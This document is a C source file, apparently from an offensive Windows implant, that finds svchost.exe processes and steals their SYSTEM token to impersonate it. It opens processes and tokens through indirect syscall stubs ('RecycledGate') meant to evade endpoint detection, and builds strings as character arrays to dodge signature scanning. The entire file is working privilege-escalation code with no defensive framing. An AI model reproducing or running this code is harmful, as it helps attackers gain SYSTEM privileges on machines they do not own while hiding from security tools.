#include "token.h"

BOOL GetSystem(PAPI pApi) {

	BOOL bSuccess = FALSE;
	DWORD dwPid = 0;

	HANDLE hProcessSnap = NULL;
	PROCESSENTRY32 pe32 = { 0x00 };
	CHAR cSvchost[] = {'s','v','c','h','o','s','t','.','e','x','e', 0x00};

	pe32.dwSize = sizeof(PROCESSENTRY32);

	hProcessSnap = pApi->Kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) 
		goto exit;
	
	if (!pApi->Kernel32.Process32First(hProcessSnap, &pe32))
		goto exit;

	do {
		if (!pApi->Kernel32.lstrcmpA(cSvchost, pe32.szExeFile)) {
			dwPid = pe32.th32ProcessID;
			bSuccess = stealToken(pApi, dwPid);
			if (bSuccess == SUCCESS) 
				break;
		}

	} while (pApi->Kernel32.Process32Next(hProcessSnap, &pe32));

	if (bSuccess == FALSE)
		goto exit;

	bSuccess = TRUE;

exit:

	if (hProcessSnap)
		pApi->Kernel32.CloseHandle(hProcessSnap);

	return bSuccess;

}

BOOL stealToken(PAPI pApi, DWORD dwPid) {

	BOOL bSuccess = FALSE;
	DWORD dwLength = 0;
	NTSTATUS status;

	HANDLE hProcess = NULL, hToken = NULL;
	PTOKEN_USER tokenuser = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	CLIENT_ID uPid = { 0 };
	SID_NAME_USE sidtype = { 0x00 };

	CHAR username[MAX_NAME] = { 0x00 };
	CHAR domainname[MAX_NAME] = { 0x00 };

	DWORD dwSizeUserName = sizeof(username);
	DWORD dwSizeDomainName = sizeof(domainname);

	CHAR cSystem[] = {'S','Y','S','T','E','M', 0x00};

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

	uPid.UniqueProcess = dwPid;
	uPid.UniqueThread = 0;

	PrepareSyscall(pApi->Nt.NtOpenProcess.dwSyscallNr, pApi->Nt.NtOpenProcess.pRecycledGate);
	status = DoSyscall(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &uPid);
	if (!NT_SUCCESS(status))
		goto exit;
	
	PrepareSyscall(pApi->Nt.NtOpenProcessToken.dwSyscallNr, pApi->Nt.NtOpenProcessToken.pRecycledGate);
	status = DoSyscall(hProcess, TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE, &hToken);
	if (!NT_SUCCESS(status)) 
		goto exit;

	pApi->Advapi32.GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)TokenUser, NULL, 0, &dwLength);
	if (dwLength == 0)
		goto exit;

	tokenuser = (PTOKEN_USER)pApi->Kernel32.VirtualAlloc(0, dwLength, MEM_COMMIT, PAGE_READWRITE);
	if (tokenuser == NULL)
		goto exit;

	bSuccess = pApi->Advapi32.GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)TokenUser, tokenuser, dwLength, &dwLength);
	if (bSuccess == FAIL)
		goto exit;

	bSuccess = pApi->Advapi32.LookupAccountSidA(NULL, tokenuser->User.Sid, username, &dwSizeUserName, domainname, &dwSizeDomainName, &sidtype);
	if (bSuccess == FAIL) 
		goto exit;

	if (pApi->Kernel32.lstrcmpA(username, cSystem)) {
		bSuccess = FALSE;
		goto exit;
	}

	bSuccess = pApi->Advapi32.ImpersonateLoggedonUser(hToken);
	if (bSuccess == FAIL)
		goto exit;

	bSuccess = TRUE;

exit:

	if (hProcess)
		pApi->Kernel32.CloseHandle(hProcess);

	if (tokenuser)
		pApi->Kernel32.VirtualFree(tokenuser, 0, MEM_RELEASE);

	return bSuccess;

}